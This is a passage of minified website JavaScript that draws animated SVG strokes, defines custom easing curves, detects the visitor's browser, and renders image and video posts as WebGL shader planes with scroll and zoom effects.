e,i,n,r,a,o,s,c=(t=d(t)).tagName.toLowerCase(),p=1,f=1;"non-scaling-stroke"===t.getAttribute("vector-effect")&&(f=t.getScreenCTM(),p=Math.sqrt(f.a*f.a+f.b*f.b),f=Math.sqrt(f.d*f.d+f.c*f.c));try{i=t.getBBox()}catch(t){}if(i&&(i.width||i.height)||!h[c]||(i={width:parseFloat(t.getAttribute(h[c][0])),height:parseFloat(t.getAttribute(h[c][1]))},"rect"!==c&&"line"!==c&&(i.width*=2,i.height*=2),"line"===c&&(i.x=parseFloat(t.getAttribute("x1")),i.y=parseFloat(t.getAttribute("y1")),i.width=Math.abs(i.width-i.x),i.height=Math.abs(i.height-i.y))),"path"===c)r=t.style.strokeDasharray,t.style.strokeDasharray="none",e=t.getTotalLength()||0,e*=(p+f)/2,t.style.strokeDasharray=r;else if("rect"===c)e=2*i.width*p+2*i.height*f;else if("line"===c)e=u(i.x,i.y,i.x+i.width,i.y+i.height,p,f);else if("polyline"===c||"polygon"===c)for(n=t.getAttribute("points").match(l)||[],"polygon"===c&&n.push(n[0],n[1]),e=0,a=2;a<n.length;a+=2)e+=u(n[a-2],n[a-1],n[a],n[a+1],p,f)||0;else"circle"!==c&&"ellipse"!==c||(o=i.width/2*p,s=i.height/2*f,e=Math.PI*(3*(o+s)-Math.sqrt((3*o+s)*(o+3*s))));return e||0}function f(t,e){if(!t)return[0,0];t=d(t),e=e||p(t)+1;var i=s(t),n=i.strokeDasharray||"",r=parseFloat(i.strokeDashoffset),a=n.indexOf(",");return a<0&&(a=n.indexOf(" ")),(n=a<0?e:parseFloat(n.substr(0,a))||1e-5)>e&&(n=e),[Math.max(0,-r),Math.max(0,n-r)]}(n=r._gsScope._gsDefine.plugin({propName:"drawSVG",API:2,version:"0.2.1",global:!0,overwriteProps:["drawSVG"],init:function(t,e,i,n){if(!t.getBBox)return!1;var r,a,o,l,h=p(t)+1;return this._style=t.style,this._target=t,"function"==typeof e&&(e=e(n,t)),!0===e||"true"===e?e="0 100%":e?-1===(e+"").indexOf(" ")&&(e="0 "+e):e="0 0",a=function(t,e,i){var n,r,a=t.indexOf(" ");return-1===a?(n=void 0!==i?i+"":t,r=t):(n=t.substr(0,a),r=t.substr(a+1)),(n=-1!==n.indexOf("%")?parseFloat(n)/100*e:parseFloat(n))>(r=-1!==r.indexOf("%")?parseFloat(r)/100*e:parseFloat(r))?[r,n]:[n,r]}(e,h,(r=f(t,h))[0]),this._length=h+10,0===r[0]&&0===a[0]?(o=Math.max(1e-5,a[1]-h),this._dash=h+o,this._offset=h-r[1]+o,this._offsetPT=this._addTween(this,"_offset",this._offset,h-a[1]+o,"drawSVG")):(this._dash=r[1]-r[0]||1e-6,this._offset=-r[0],this._dashPT=this._addTween(this,"_dash",this._dash,a[1]-a[0]||1e-5,"drawSVG"),this._offsetPT=this._addTween(this,"_offset",this._offset,-a[0],"drawSVG")),c&&(l=s(t)).strokeLinecap!==l.strokeLinejoin&&(a=parseFloat(l.strokeMiterlimit),this._addTween(t.style,"strokeMiterlimit",a,a+1e-4,"strokeMiterlimit")),this._live="non-scaling-stroke"===t.getAttribute("vector-effect")||-1!==(e+"").indexOf("live"),!0},set:function(t){if(this._firstPT){if(this._live){var e,i=p(this._target)+11;i!==this._length&&(e=i/this._length,this._length=i,this._offsetPT.s*=e,this._offsetPT.c*=e,this._dashPT?(this._dashPT.s*=e,this._dashPT.c*=e):this._dash*=e)}this._super.setRatio.call(this,t),this._style.strokeDashoffset=this._offset,this._style.strokeDasharray=1===t||0===t?this._offset<.001&&this._length-this._dash<=10?"none":this._offset===this._dash?"0px, 999999px":this._dash+"px,"+this._length+"px":this._dash+"px,"+this._length+"px"}}})).getLength=p,n.getPosition=f},function(t,e,i){"use strict";i.r(e),i.d(e,"CustomEase",(function(){return r})),i.d(e,"default",(function(){return r})),i(22),i(29);var n=i(1);n._gsScope._gsDefine("easing.CustomEase",["easing.Ease"],(function(){var t=/(?:(-|-=|\+=)?\d*\.?\d*(?:e[\-+]?\d+)?)[0-9]/gi,e=/[achlmqstvz]|(-?\d*\.?\d*(?:e[\-+]?\d+)?)[0-9]/gi,i=/[\+\-]?\d*\.?\d+e[\+\-]?\d+/gi,r=/[cLlsS]/g,a="CustomEase only accepts Cubic Bezier data.",o=function t(e,i,n,r,a,o,s,l,c,h,u){var d,p=(e+n)/2,f=(i+r)/2,m=(n+a)/2,_=(r+o)/2,g=(a+s)/2,v=(o+l)/2,y=(p+m)/2,x=(f+_)/2,b=(m+g)/2,w=(_+v)/2,T=(y+b)/2,S=(x+w)/2,M=s-e,E=l-i,L=Math.abs((n-s)*E-(r-l)*M),k=Math.abs((a-s)*E-(o-l)*M);return h||(h=[{x:e,y:i},{x:s,y:l}],u=1),h.splice(u||h.length-1,0,{x:T,y:S}),(L+k)*(L+k)>c*(M*M+E*E)&&(d=h.length,t(e,i,p,f,y,x,T,S,c,h,u),t(T,S,b,w,g,v,s,l,c,h,u+1+(h.length-d))),h},s=function(t){var e=this.lookup[t*this.l|0]||this.lookup[this.l-1];return e.nx<t&&(e=e.n),e.y+(t-e.x)/e.cx*e.cy},l=function(t,e,i){this._calcEnd=!0,this.id=t,t&&(n.Ease.map[t]=this),this.getRatio=s,this.setData(e,i)},c=l.prototype=new n.Ease;return c.constructor=l,c.setData=function(n,s){var l,c,h,u,d,p,f,m,_,g,v=(n=n||"0,0,1,1").match(t),y=1,x=[];if(g=(s=s||{}).precision||1,this.data=n,this.lookup=[],this.points=x,this.fast=g<=1,(r.test(n)||-1!==n.indexOf("M")&&-1===n.indexOf("C"))&&(v=function(t){var n,r,o,s,l,c,h,u,d,p,f,m=(t+"").replace(i,(function(t){var e=+t;return e<1e-4&&e>-1e-4?0:e})).match(e)||[],_=[],g=0,v=0,y=m.length,x=2;for(n=0;n<y;n++)if(d=s,isNaN(m[n])?l=(s=m[n].toUpperCase())!==m[n]:n--,r=+m[n+1],o=+m[n+2],l&&(r+=g,o+=v),n||(h=r,u=o),"M"===s)c&&c.length<8&&(_.length-=1,x=0),g=h=r,v=u=o,c=[r,o],x=2,_.push(c),n+=2,s="L";else if("C"===s)c||(c=[0,0]),c[x++]=r,c[x++]=o,l||(g=v=0),c[x++]=g+1*m[n+3],c[x++]=v+1*m[n+4],c[x++]=g+=1*m[n+5],c[x++]=v+=1*m[n+6],n+=6;else if("S"===s)"C"===d||"S"===d?(p=g-c[x-4],f=v-c[x-3],c[x++]=g+p,c[x++]=v+f):(c[x++]=g,c[x++]=v),c[x++]=r,c[x++]=o,l||(g=v=0),c[x++]=g+=1*m[n+3],c[x++]=v+=1*m[n+4],n+=4;else{if("L"!==s&&"Z"!==s)throw a;"Z"===s&&(r=h,o=u,c.closed=!0),("L"===s||Math.abs(g-r)>.5||Math.abs(v-o)>.5)&&(c[x++]=g+(r-g)/3,c[x++]=v+(o-v)/3,c[x++]=g+2*(r-g)/3,c[x++]=v+2*(o-v)/3,c[x++]=r,c[x++]=o,"L"===s&&(n+=2)),g=r,v=o}return _[0]}(n)),4===(l=v.length))v.unshift(0,0),v.push(1,1),l=8;else if((l-2)%6)throw a;for(0==+v[0]&&1==+v[l-2]||function(t,e,i){i||0===i||(i=Math.max(+t[t.length-1],+t[1]));var n,r=-1*+t[0],a=-i,o=t.length,s=1/(+t[o-2]+r),l=-e||(Math.abs(+t[o-1]-+t[1])<.01*(+t[o-2]-+t[0])?function(t){var e,i=t.length,n=999999999999;for(e=1;e<i;e+=6)+t[e]<n&&(n=+t[e]);return n}(t)+a:+t[o-1]+a);for(l=l?1/l:-s,n=0;n<o;n+=2)t[n]=(+t[n]+r)*s,t[n+1]=(+t[n+1]+a)*l}(v,s.height,s.originY),this.rawBezier=v,u=2;u<l;u+=6)c={x:+v[u-2],y:+v[u-1]},h={x:+v[u+4],y:+v[u+5]},x.push(c,h),o(c.x,c.y,+v[u],+v[u+1],+v[u+2],+v[u+3],h.x,h.y,1/(2e5*g),x,x.length-1);for(l=x.length,u=0;u<l;u++)f=x[u],m=x[u-1]||f,f.x>m.x||m.y!==f.y&&m.x===f.x||f===m?(m.cx=f.x-m.x,m.cy=f.y-m.y,m.n=f,m.nx=f.x,this.fast&&u>1&&Math.abs(m.cy/m.cx-x[u-2].cy/x[u-2].cx)>2&&(this.fast=!1),m.cx<y&&(m.cx?y=m.cx:(m.cx=.001,u===l-1&&(m.x-=.001,y=Math.min(y,.001),this.fast=!1)))):(x.splice(u--,1),l--);if(l=1/y+1|0,this.l=l,d=1/l,p=0,f=x[0],this.fast){for(u=0;u<l;u++)_=u*d,f.nx<_&&(f=x[++p]),c=f.y+(_-f.x)/f.cx*f.cy,this.lookup[u]={x:_,cx:d,y:c,cy:0,nx:9},u&&(this.lookup[u-1].cy=c-this.lookup[u-1].y);this.lookup[l-1].cy=x[x.length-1].y-c}else{for(u=0;u<l;u++)f.nx<u*d&&(f=x[++p]),this.lookup[u]=f;p<x.length-1&&(this.lookup[u-1]=x[x.length-2])}return this._calcEnd=1!==x[x.length-1].y||0!==x[0].y,this},c.getRatio=s,c.getSVGData=function(t){return l.getSVGData(this,t)},l.create=function(t,e,i){return new l(t,e,i)},l.version="0.2.2",l.bezierToPoints=o,l.get=function(t){return n.Ease.map[t]},l.getSVGData=function(t,e){var i,r,a,o,s,l,c,h,u,d,p=(e=e||{}).width||100,f=e.height||100,m=e.x||0,_=(e.y||0)+f,g=e.path;if(e.invert&&(f=-f,_=0),(t=t.getRatio?t:n.Ease.map[t]||void 0).rawBezier){for(i=[],c=t.rawBezier.length,a=0;a<c;a+=2)i.push((1e3*(m+t.rawBezier[a]*p)|0)/1e3+","+(1e3*(_+t.rawBezier[a+1]*-f)|0)/1e3);i[0]="M"+i[0],i[1]="C"+i[1]}else for(i=["M"+m+","+_],o=1/(c=Math.max(5,200*(e.precision||1))),h=5/(c+=2),u=(1e3*(m+o*p)|0)/1e3,r=((d=(1e3*(_+t.getRatio(o)*-f)|0)/1e3)-_)/(u-m),a=2;a<c;a++)s=(1e3*(m+a*o*p)|0)/1e3,l=(1e3*(_+t.getRatio(a*o)*-f)|0)/1e3,(Math.abs((l-d)/(s-u)-r)>h||a===c-1)&&(i.push(u+","+d),r=(l-d)/(s-u)),u=s,d=l;return g&&("string"==typeof g?document.querySelector(g):g).setAttribute("d",i.join(" ")),i.join(" ")},l}),!0);var r=n.globals.CustomEase},,,function(t,e){window.__IS_RETINA__=!1,window.devicePixelRatio>1&&(__IS_RETINA__=!0),window.$html=document.querySelectorAll("html")[0],window.$body=document.querySelectorAll("body")[0],window.$video=document.getElementById("js--video"),window.__TODAY__=new Date,window.__QUERY__="?v=1.0.8",window.__ENV__={skip:!1,autojump:!0,mouse:!0,hole:!0},window.__ANIM__=.67,window.detectWebGLContext=function(){var t=document.createElement("canvas"),e=t.getContext("webgl")||t.getContext("experimental-webgl");return!!(e&&e instanceof WebGLRenderingContext)},window.__FONTS__={fontFamily:'"Neue", "Hiragino Kaku Gothic ProN", "ヒラギノ角ゴ ProN W3", Meiryo, メイリオ, sans-serif',fontWeight:"700",lineGap:-.13,padding:10*window.devicePixelRatio,fontSize:{vw:6.7,vh:10.88,useVW:!0}},window.__RGB__={home:{opacity:.6,rgb:.05},single:{opacity:.9,rgb:.04},works:{opacity:.85,rgb:.04}},window.__COL_B__=6,window.__COL_BLACK__="rgb("+__COL_B__+","+__COL_B__+","+__COL_B__+")",window.__COL_M__=__COL_B__/2,window.__COL_MBLACK__="rgb("+__COL_M__+","+__COL_M__+","+__COL_M__+")",window.__COL_W__=250,window.__COL_WHITE__="rgb("+__COL_W__+","+__COL_W__+","+__COL_W__+")",window.__COL_STROKE_WHITE__="rgba("+__COL_W__+","+__COL_W__+","+__COL_W__+", 0.2 )",window.__COL_A__=.5,window.__PAGE_TYPE__=null,window.__EASE_1__=CustomEase.create("custom","M0,0 C0.212,0 0.247,0.014 0.326,0.09 0.402,0.164 0.414,0.196 0.44,0.376 0.44,0.376 0.478,0.536 0.498,0.64 0.536,0.84 0.63,0.978 1,1"),window.__WT__=0,window.__MT__=0,window.__WTP__=0,window.__WH__=window.innerHeight,window.__WW__=window.innerWidth,window.__WO__="yoko",window.__WIN__=0,window.__LEGACY__=!1,window.__LOWSPEC__=!1,window.__MIDSPEC__=!1,window.__BROWSER__="",window.__UA__=window.navigator.userAgent.toLowerCase(),window.__UA_VER__=window.navigator.appVersion.toLowerCase(),-1!=window.navigator.platform.indexOf("Win")&&(__WIN__=1),-1!==__UA__.indexOf("edge")?(__BROWSER__="Edge",__LEGACY__=!0,$html.classList.add("is-edge")):-1!==__UA__.indexOf("iemobile")?(__BROWSER__="ieMobile",__LEGACY__=!0,__LOWSPEC__=!0,$html.classList.add("is-iemobile")):-1!==__UA__.indexOf("trident/7")?(__BROWSER__="ie11",__LEGACY__=!0,__LOWSPEC__=!0,$html.classList.add("is-ie")):-1!==__UA__.indexOf("msie")&&-1===__UA__.indexOf("opera")?-1!==__UA_VER__.indexOf("msie 6.")?(__BROWSER__="ie6",__LEGACY__=!0,__LOWSPEC__=!0,$html.classList.add("is-ie")):-1!==__UA_VER__.indexOf("msie 7.")?(__BROWSER__="ie7",__LEGACY__=!0,__LOWSPEC__=!0,$html.classList.add("is-ie")):-1!==__UA_VER__.indexOf("msie 8.")?(__BROWSER__="ie8",__LEGACY__=!0,__LOWSPEC__=!0,$html.classList.add("is-ie")):-1!==__UA_VER__.indexOf("msie 9.")?(__BROWSER__="ie9",__LEGACY__=!0,__LOWSPEC__=!0,$html.classList.add("is-ie")):-1!==__UA_VER__.indexOf("msie 10.")&&(__BROWSER__="ie10",__LEGACY__=!0,__LOWSPEC__=!0,$html.classList.add("is-ie")):-1!==__UA__.indexOf("chrome")&&-1===__UA__.indexOf("edge")?(__BROWSER__="chrome",$html.classList.add("is-chrome")):-1!==__UA__.indexOf("safari")&&-1===__UA__.indexOf("chrome")?(__MIDSPEC__=!0,__BROWSER__="safari",$html.classList.add("is-safari")):-1!==__UA__.indexOf("opera")?(__BROWSER__="opera",$html.classList.add("is-opera")):-1!==__UA__.indexOf("firefox")?(__BROWSER__="firefox",$html.classList.add("is-firefox")):(__BROWSER__="unknown",$html.classList.add("is-unknown")),detectWebGLContext||(__LEGACY__=!0,__LOWSPEC__=!0),__LEGACY__&&$html.classList.add("is-legacy"),__LOWSPEC__&&$html.classList.add("is-low")},function(t,e,i){"use strict";i.r(e);var n=i(160),r=i.n(n),a=i(161),o=i.n(a);window.backGL={__Flag_ok__:!1,scale:1,width:0,height:0,firstview:null,effect:5,anim:{mag_power:{from:.5,to:2,value:0,power:1},mag_radius:{from:1,to:1.5,value:0,power:1},nz_power:{from:0,to:.3,value:0,power:1}},once:function(){isMobileFixed.tablet||isMobileFixed.phone?this.scale=1:window.innerWidth>=1980?this.scale=.75:window.innerWidth>=2560?this.scale=.5:(__SPEC__.score>=8||__SPEC__.score>=7)&&(this.scale=.75),this.width=window.innerWidth,this.height=window.innerHeight,this.canvas=document.getElementById("js--gl-back"),this.renderer=new THREE.WebGLRenderer({canvas:this.canvas,alpha:!1,antialias:!1}),this.renderer.setSize(this.width*this.scale,this.height*this.scale),this.scene=new THREE.Scene,this.scene.background=new THREE.Color(__COL_BLACK__),this.camera=new THREE.PerspectiveCamera(90,this.width/this.height,.1,this.height/2),this.camera.position.z=this.height/2,this.stage=new THREE.Group,this.scene.add(this.stage),this.anim.mag_power.from=0,this.anim.mag_power.value=0,this.anim.mag_radius.from=1.5,this.anim.mag_radius.value=1.5},onLoadAssets:function(){},onLoaded:function(){switch(this.geometry=new THREE.PlaneBufferGeometry(1,1,1,1),this.material=new THREE.ShaderMaterial({visible:!0,transparent:!0,uniforms:{pixel_rario:{value:1/this.scale},tDiffuse:{type:"t",value:null},is_desktop:{value:0},fxaa:{type:"v2",value:new THREE.Vector2},resolution:{type:"v2",value:new THREE.Vector2},effect:{value:this.effect},wheel_power:{type:"f",value:0},mag_power:{type:"f",value:0},mag_radius:{type:"f",value:0},mouse:{type:"v2",value:new THREE.Vector2},pivot:{type:"v2",value:new THREE.Vector2},nz_position:{value:new THREE.Vector2},nz_time:{value:0},nz_power:{type:"f",value:0},rgb:{value:__COL_B__/255},is_subpages:{value:0},offsetX:{type:"f",value:0},offsetY:{type:"f",value:0},scale:{type:"f",value:1},opacity:{type:"f",value:1}},vertexShader:o.a,fragmentShader:r.a}),__PAGE_TYPE__){case"home":this.material.uniforms.tDiffuse.value=this.__HOME__.fbo.texture;break;case"single":__IS_PICKUP__?this.material.uniforms.tDiffuse.value=this.__HOME__.fbo.texture:this.material.uniforms.tDiffuse.value=this.__SINGLE__.fbo.texture;break;case"works":case"reel":this.material.uniforms.tDiffuse.value=null;break;case"about":case"contact":isMobileFixed.any||(this.material.uniforms.tDiffuse.value=this.__FOOTER__.fbo.texture)}this.material.uniforms.mouse.value.x=mouse.fx,this.material.uniforms.mouse.value.y=mouse.fy,this.material.uniforms.pivot.value.y=.5,this.material.uniforms.pivot.value.x=.5,this.material.uniforms.nz_position.value.x=3,this.material.uniforms.nz_position.value.y=1,this.material.uniforms.resolution.value.x=this.width,this.material.uniforms.resolution.value.y=this.height,this.material.uniforms.fxaa.value.x=1/this.width,this.material.uniforms.fxaa.value.y=1/this.height,isMobileFixed.any?this.material.uniforms.is_desktop.value=0:this.material.uniforms.is_desktop.value=1,this.firstview=new THREE.Mesh(this.geometry,this.material),this.firstview.scale.set(this.width,this.height,1),this.firstview.position.z=2,this.scene.add(this.firstview)},normal:0,onUpdate:function(){switch(isMobileFixed.any?__WW__<__WH__?(this.material.uniforms.mag_power.value=1,this.material.uniforms.mag_radius.value=1):(this.material.uniforms.mag_power.value=0,this.material.uniforms.mag_radius.value=0):(this.material.uniforms.mag_radius.value=this.anim.mag_radius.value,this.material.uniforms.nz_power.value=(1-this.normal)*(this.anim.nz_power.power*this.anim.nz_power.value),this.material.uniforms.mag_power.value=this.anim.mag_power.value),__PAGE_TYPE__){case"home":this.material.visible=!0,this.material.uniforms.mouse.value.x=mouse.fx,this.material.uniforms.mouse.value.y=mouse.fy,this.firstview.position.y=0,this.material.uniforms.offsetY.value=0,__WIN__?this.material.uniforms.wheel_power.value=Math.abs(1.5*fakeWheel.speed.pow1)+.05:this.material.uniforms.wheel_power.value=Math.min(Math.abs(2*fakeWheel.speed.pow1),.36),this.material.uniforms.is_subpages.value=0;break;case"single":this.material.uniforms.is_subpages.value=0,this.material.uniforms.wheel_power.value=0,fakeScroll.body.y>=fakeScroll.total_height-2.5*__WH__||(this.firstview.position.y>__WH__?(this.material.visible=!1,this.firstview.position.y=0,this.material.uniforms.offsetY.value=0):(this.material.visible=!0,this.firstview.position.y=fakeScroll.body.y,this.material.uniforms.offsetY.value=-fakeScroll.body.y/__WH__*.9));break;case"about":case"contact":this.material.uniforms.mouse.value.x=mouse.sx,this.material.uniforms.mouse.value.y=mouse.sy,this.material.uniforms.mag_power.value=this.anim.mag_power.from,this.material.uniforms.mag_radius.value=this.anim.mag_radius.from,this.material.uniforms.nz_power.value=this.anim.nz_power.from,this.material.uniforms.offsetY.value=0,this.material.uniforms.is_subpages.value=1,this.material.visible=!0,this.firstview.position.y=0;break;case"works":case"reel":this.material.uniforms.mouse.value.x=mouse.sx,this.material.uniforms.mouse.value.y=mouse.sy,this.material.uniforms.mag_power.value=this.anim.mag_power.from,this.material.uniforms.mag_radius.value=this.anim.mag_radius.from,this.material.uniforms.nz_power.value=this.anim.nz_power.from,this.material.uniforms.offsetY.value=0,this.material.uniforms.is_subpages.value=0,this.material.visible=!1,this.firstview.position.y=0}isMobileFixed.any&&(this.material.uniforms.mouse.value.x=.5,this.material.uniforms.mouse.value.y=.5)},onResize:function(){this.width=__WW__,this.height=__WH__,this.renderer.setSize(this.width*this.scale,this.height*this.scale),this.camera.aspect=this.width/this.height,this.camera.position.z=this.height/2,this.camera.far=this.height/2,this.camera.updateProjectionMatrix(),this.material.uniforms.resolution.value.x=this.width,this.material.uniforms.resolution.value.y=this.height,this.firstview.scale.set(this.width,this.height,1)},tweens:[],onZoomIn:function(t){var e;Power2,this.material.uniforms.nz_time.value=100*Math.random();for(var i=this.tweens.length-1;i>=0;i--)this.tweens[i]&&this.tweens[i].kill();this.tweens=[],(e=new TimelineLite).to(this.anim.mag_power,.5*t,{value:this.anim.mag_power.to,ease:Power2.easeIn}),e.to(this.anim.mag_power,t,{value:this.anim.mag_power.from,ease:Power2.easeOut}),this.tweens.push(e),e.to(this.anim.mag_radius,1.5*t,{value:this.anim.mag_radius.to,ease:Power2.easeInOut}),this.tweens.push(e),(e=new TimelineLite).to(this.anim.nz_power,.5*t,{value:this.anim.nz_power.to,ease:Power2.easeIn}),e.to(this.anim.nz_power,t,{value:this.anim.nz_power.from,ease:Power2.easeOut}),this.tweens.push(e)},onReset:function(){}}},function(t,e,i){"use strict";i.r(e),i(4);var n=i(162),r=i.n(n),a=i(163),o=i.n(a);backGL.__HOME__={__Flag_ok__:!1,__Flag_splash__:!1,default:{stage:{wrap:.7,x:0,y:.38,deg:.3,padding:{top:0},offset:{x:-.033}},planes:{x:1,y:1},offset:{x:0,y:.2},skew:{x:0,y:0},uniforms:{from:{scale:1.1,opacity:__RGB__.home.opacity,rgb:__RGB__.home.rgb,gradient:0},to:{scale:1,opacity:__RGB__.single.opacity,rgb:__RGB__.single.rgb,gradient:1}}},height:0,padding:0,total:0,scroll_ratio:1,total_height:0,total_width:0,max_width:0,align:"left",zoom:{ing:!1,tween:null,enable:!1,scale:.8,stage:{z:0,x:0},plane:{x:0,y:0,z:0},pow:0},slideTo:{y:0,py:0,ease:.3},once:function(){for(var t=0;t<__POSTS__.length;t++)__POSTS__[t].is_clone||this.total++;if(isMobileFixed.any)this.align="center",this.scroll_ratio=.5,this.default.stage.x=0,this.default.stage.y=1.1,this.default.stage.deg=0,this.default.stage.padding.top=0,this.default.uniforms.from.scale=1,this.default.uniforms.from.opacity=.55,this.default.uniforms.from.rgb=.08,this.default.uniforms.from.gradient=0,this.default.uniforms.to.scale=1,this.default.uniforms.to.opacity=.55,this.default.uniforms.to.rgb=.08,this.default.uniforms.to.gradient=0,this.default.planes.x=2*this.default.stage.deg*__WH__/__WW__,this.default.stage.offset.x=0,this.default.offset.y=.5,this.loop.enable=!1,this.center.index=3;else{var e=(2*Math.random()-1)/100;this.default.stage.y=this.default.stage.y+e,this.default.stage.padding.top=(this.default.stage.wrap-this.default.stage.y)/2}this.scene=new THREE.Scene,this.camera=new THREE.PerspectiveCamera(90,backGL.width/backGL.height,.1,900),this.camera.position.z=backGL.height/2,this.scene.add(this.camera),this.stage=new THREE.Group,this.scene.add(this.stage),this.onResize();var i={minFilter:THREE.LinearFilter,magFilter:THREE.LinearFilter,format:THREE.RGBFormat,stencilBuffer:!1};this.fbo=new THREE.WebGLRenderTarget(backGL.width,backGL.height,i),this.fbo.texture.name="HOME"},onLoadAssets:function(){this.onLoadMesh()},onLoadMesh:function(){var t=this;__POSTS__.forEach((function(e,i){var n=getImageSrc(e.img.src.d1x,e.img.src.d2x),r=new THREE.TextureLoader(loading.contents);r.crossOrigin="anonymous",r.load(n,(function(n){var r=n.image.naturalWidth,a=n.image.naturalHeight;if(e.size.origin.w=r,e.size.origin.h=a,e.size.ratio=e.size.origin.w/e.size.origin.h,e.size.scaled.h=t.height,e.size.scaled.w=t.height*e.size.ratio,e.size.zoomed.h=__WH__,e.size.zoomed.w=__WH__*e.size.ratio,n.minFilter=THREE.LinearFilter,e.img.tex=n,"video"===e.type){if(!document.querySelectorAll("#post_id_"+e.post_id).length){var o="";e.video.mp4_2x&&(o='<source src="'+e.video.mp4_2x+'" type="video/mp4">');var s="";e.video.mp4_1x&&(s='<source src="'+e.video.mp4_1x+'" type="video/mp4">');var l=document.createElement("video");l.setAttribute("id","post_id_"+e.post_id),l.setAttribute("crossOrigin","anonymous"),l.setAttribute("preload","none"),l.setAttribute("class","type-a"),l.playsInline=!0,l.controls=!1,l.autoplay=!1,l.muted=!0,l.loop=!0,__IS_RETINA__&&!isMobileFixed.any?l.innerHTML=o:l.innerHTML=s,$video.appendChild(l)}e.video.el=document.getElementById("post_id_"+e.post_id),e.is_loaded_video=!1,e.video.el.addEventListener("loadeddata",(function(t){e.is_loaded_data=!0}));var c=new THREE.VideoTexture(e.video.el);c.minFilter=THREE.LinearFilter,e.video.tex=c,t.addTexture(e.img.tex,e.video.tex,i)}else t.addTexture(e.img.tex,e.img.tex,i)}))}))},addTexture:function(t,e,i){var n=new THREE.PlaneBufferGeometry(1,1,1);n.applyMatrix((new THREE.Matrix4).makeTranslation(.5,0,0));var a=new THREE.ShaderMaterial({visible:!0,transparent:!0,uniforms:{tDiffuse:{type:"t",value:t},tImage:{type:"t",value:t},tVideo:{type:"t",value:e},power:{type:"f",value:0},fade:{type:"f",value:0},alpha:{type:"f",value:0},gradient:{type:"f",value:this.default.uniforms.from.gradient},dir:{type:"f",value:0},is_video:{value:0},is_loaded_data:{value:0},offsetX:{type:"f",value:0},offsetY:{type:"f",value:0},scale:{type:"f",value:this.default.uniforms.from.scale},opacity:{type:"f",value:this.default.uniforms.from.opacity},rgb:{value:this.default.uniforms.from.rgb},rgb_shift:{value:0},reflection:{value:{x:1,y:1}},cy:{type:"f",value:0}},vertexShader:o.a,fragmentShader:r.a,side:THREE.DoubleSide});__POSTS__[i].video.el&&(a.uniforms.is_video.value=1),__POSTS__[i].plane.mesh=new THREE.Mesh(n,a),__POSTS__[i].plane.mesh.index=i,__POSTS__[i].plane.mesh.scale.set(__POSTS__[i].size.scaled.w,__POSTS__[i].size.scaled.h,1),this.stage.add(__POSTS__[i].plane.mesh)},onLoaded:function(){this.__Flag_ok__=!0,this.setPosition()},onResize:function(){this.camera.aspect=backGL.width/backGL.height,this.camera.position.z=backGL.height/2,this.camera.updateProjectionMatrix(),this.height=__WH__*this.default.stage.y,this.padding=__WH__*this.default.stage.padding.top;var t=this;__POSTS__.forEach((function(e,i){e.size.ratio=e.size.origin.w/e.size.origin.h,e.size.scaled.h=t.height,e.size.scaled.w=t.height*e.size.ratio,e.plane.mesh&&e.plane.mesh.scale.set(e.size.scaled.w,e.size.scaled.h,1)})),(this.__Flag_ok__&&"home"===__PAGE_TYPE__||this.__Flag_ok__&&"single"===__PAGE_TYPE__)&&(this.zoom.enable?this.setPositionZoomed():this.setPosition())},copy:{x1:0,x2:0,y1:0,y2:0},setPositionZoomed:function(){var t=this,e=this;__POSTS__.forEach((function(i,n){if(i.post_id!=e.center.post_id)return!1;var r=i.plane.mesh,a=r.scale.x,o=r.scale.y,s=(__WH__,__WH__*i.size.ratio),l=(1-2*e.default.stage.x)/2,c=-__WW__*l+__WW__/2-a/2,h=.5*(__WH__-o);s<__WW__&&(h=1.5*o>=a?.5*(__WH__-o):.5*(__WH__-o)*__WW__/s),t.zoom.plane.x=c,t.zoom.plane.z=h*t.zoom.scale}))},setPosition:function(){var t=this,e=this,i=[],n=0,r=0;this.total_width=0,this.total_height=0,__POSTS__.forEach((function(a,o){e.total_width+=a.size.scaled.w+e.padding,e.total_height+=t.height+e.padding,0!=o?(n+=__POSTS__[o-1].size.scaled.w+e.padding,r-=t.height+e.padding,a.plane.mesh&&(a.plane.mesh.position.y=r)):(n=0,r=0),a.plane.pos.px=n,a.plane.pos.py=r,i.push(__POSTS__[o].size.scaled.w)})),this.copy.y1=3*(this.height+this.padding),this.copy.y2=__WH__-2*this.copy.y1,this.max_width=Math.max.apply(null,i),isMobileFixed.any||(this.default.stage.x=this.max_width/__WW__*.5),this.stage.position.x=-__WW__*this.default.stage.x,this.stage.position.y=this.copy.y1,"home"===__PAGE_TYPE__&&(isMobileFixed.any?(this.total_height=this.total_height+this.copy.y2-(this.height+this.padding),fakeScroll.setHeight(this.total_height,this.scroll_ratio)):(this.total_height=this.total_height+this.copy.y2,fakeScroll.setHeight(this.total_height,this.scroll_ratio)))},start_index:2,center:{tween:[],index:0,arr:[],obj:[]},onScrollReset:function(){this.onResetTweens(),window.scrollTo(0,0),__WT__=0,fakeScroll.body.y=0,this.center.arr=[],this.center.obj=[],isMobileFixed.any?(this.center.index=3,this.center.post_id=__POSTS__[this.center.index].post_id):(this.center.index=0,this.center.post_id=__POSTS__[this.center.index].post_id)},onResetTweens:function(){this.zoom.tween&&this.zoom.tween.kill();for(var t=0;t<this.center.tween.length;t++)this.center.tween[t]&&this.center.tween[t].kill()},onScroll:function(){this.center.arr=[],this.center.obj=[];for(var t=0;t<__POSTS__.length;t++){var e=__POSTS__[t];if(e.plane.mesh&&e.plane.mesh.material.visible){var i=Math.abs(e.plane.mesh.position.y+this.copy.y1);this.center.arr.push(i),this.center.obj.push({y:i,index:t,post_id:e.post_id})}}for(var n=Math.min.apply(null,this.center.arr),r=0;r<this.center.obj.length;r++)this.center.obj[r].y===n&&(this.center.index=this.center.obj[r].index,this.center.post_id=this.center.obj[r].post_id);if(fakeScroll.ing&&!isMobileFixed.any)for(t=0;t<__POSTS__.length;t++)__POSTS__[t].video.el&&__POSTS__[t].video.el.pause()},onScrollStart:function(){if(!isMobileFixed.any)for(var t=__POSTS__.length-1;t>=0;t--)__POSTS__[t].video.el&&__POSTS__[t].video.el.pause()},onScrollIng:function(){},onScrollComplete:function(){if(!routeTransition.__Flag__start&&this.autoScroll){__WIN__?this.onScrollTo(this.center.index,2.8,Power2.easeOut):this.onScrollTo(this.center.index,1.4,Power2.easeOut);for(var t=__POSTS__.length-1;t>=0;t--)__POSTS__[t].post_id===this.center.post_id?(__POSTS__[t].video.el&&!__MIDSPEC__&&onPlayVideo(__POSTS__[t].video.el),__POSTS__[t].selected=!0):(__POSTS__[t].video.el&&__POSTS__[t].video.el.pause(),__POSTS__[t].selected=!1)}},onTouchStart:function(){for(var 